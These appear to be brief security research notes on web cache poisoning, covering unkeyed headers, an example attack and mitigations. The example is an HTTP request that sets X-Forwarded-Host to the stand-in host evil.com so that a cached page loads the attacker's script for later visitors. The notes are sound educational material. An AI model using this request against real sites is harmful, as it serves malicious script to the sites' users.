---
title: "Web Cache Poisoning"
date: "2026-09-20"
description: "Research notes covering unkeyed inputs, cache keys, headers and parameter handling."
---

# Web Cache Poisoning

Web cache poisoning is an advanced technique where an attacker manipulates a cache to serve malicious content to other users.

## Identifying Unkeyed Inputs

The first step in discovering cache poisoning vulnerabilities is identifying "unkeyed inputs". These are parts of the request (like certain HTTP headers) that the cache uses to generate a response, but does not include in the cache key.

Common unkeyed headers:
- `X-Forwarded-Host`
- `X-Host`
- `X-Forwarded-Scheme`
- `Origin`

## Example Attack

1. Find an endpoint that reflects the `X-Forwarded-Host` header into the response (e.g., dynamically generating a `<script src="...">` tag based on it).
2. Send a request with a malicious `X-Forwarded-Host` header:

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: evil.com
```

3. The server responds with `<script src="https://evil.com/app.js"></script>`.
4. If the cache is configured to cache this response without including `X-Forwarded-Host` in the cache key, the malicious response is now stored under the standard cache key (`example.com/`).
5. When normal users visit `example.com/`, they receive the poisoned response containing the malicious script.

## Mitigation

The most robust defense is to disable caching altogether if it's not needed. If caching is necessary, ensure that *all* inputs used to generate the response are included in the cache key, or avoid using unkeyed inputs in server-side logic.
